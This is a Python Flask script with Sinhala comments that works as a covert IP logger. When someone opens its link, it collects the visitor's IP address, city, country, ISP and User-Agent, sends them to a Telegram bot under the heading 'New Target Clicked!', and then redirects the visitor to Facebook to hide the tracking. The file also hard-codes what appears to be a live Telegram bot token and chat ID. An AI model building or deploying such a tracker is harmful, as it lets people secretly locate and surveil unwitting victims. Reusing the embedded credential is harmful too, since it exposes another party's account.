from flask import Flask, request, redirect
import requests

app = Flask(__name__)

# Telegram Configuration
BOT_TOKEN = '8524435746:AAGpGH-ygNIUIsn9NGFZBsMUaKDDRpus8eI'
CHAT_ID = '7883989086'

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
    requests.post(url, json=payload)

@app.route('/')
def track_user():
    # 1. User ගේ IP ලිපිනය ලබා ගැනීම
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0]
    else:
        ip = request.remote_addr

    # 2. IP එකෙන් Geolocation විස්තර ලබා ගැනීම
    geo_data = requests.get(f"http://ip-api.com/json/{ip}").json()
    
    # 3. පණිවිඩය සකස් කිරීම
    msg = f"🎯 *New Target Clicked!*\n\n" \
          f"🌐 IP: `{ip}`\n" \
          f"📍 Country: {geo_data.get('country', 'Unknown')}\n" \
          f"🏙️ City: {geo_data.get('city', 'Unknown')}\n" \
          f"🏢 ISP: {geo_data.get('isp', 'Unknown')}\n" \
          f"📱 User-Agent: {request.headers.get('User-Agent')}"

    # 4. Telegram වෙත යැවීම
    send_to_telegram(msg)

    # 5. පරිශීලකයා නියමිත Facebook Page එකකට Redirect කිරීම
    return redirect("https://www.facebook.com")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)